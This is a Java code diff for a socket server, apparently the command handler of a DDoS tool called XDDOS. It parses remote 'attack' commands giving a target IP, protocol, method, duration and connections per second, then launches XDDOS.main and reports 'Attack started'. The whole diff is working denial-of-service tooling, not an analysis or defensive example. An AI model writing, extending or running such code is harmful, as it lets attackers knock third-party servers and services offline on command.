@@ -18,20 +18,23 @@ public class Server implements Runnable{
             while(line != null){
                 System.out.println(line);
                 line = reader.readLine();
-                String ip = line.split(" ")[0];
-                int protocol = Integer.parseInt(line.split(" ")[1]);
-                String method = line.split(" ")[2];
-                int time = Integer.parseInt(line.split(" ")[3]);
-                int CPS = Integer.parseInt(line.split(" ")[4]);
-                PrintWriter writer = new PrintWriter(socket.getOutputStream());
-                if(XDDOS.attackIsRunning) {
-                writer.println("Attack is already running");
-                writer.flush();
-                }
-                else {
-                XDDOS.main(ip, protocol, method, time, CPS);
-                writer.println("Attack started");
-                writer.flush();
+                if(line.startsWith("attack")){
+                    line = line.substring(7);
+                    String ip = line.split(" ")[0];
+                    int protocol = Integer.parseInt(line.split(" ")[1]);
+                    String method = line.split(" ")[2];
+                    int time = Integer.parseInt(line.split(" ")[3]);
+                    int CPS = Integer.parseInt(line.split(" ")[4]);
+                    PrintWriter writer = new PrintWriter(socket.getOutputStream());
+                    if(XDDOS.attackIsRunning) {
+                    writer.println("Attack is already running");
+                    writer.flush();
+                    }
+                    else {
+                    XDDOS.main(ip, protocol, method, time, CPS);
+                    writer.println("Attack started");
+                    writer.flush();
+                    }
                 }
             } 
         } catch(Exception e) {
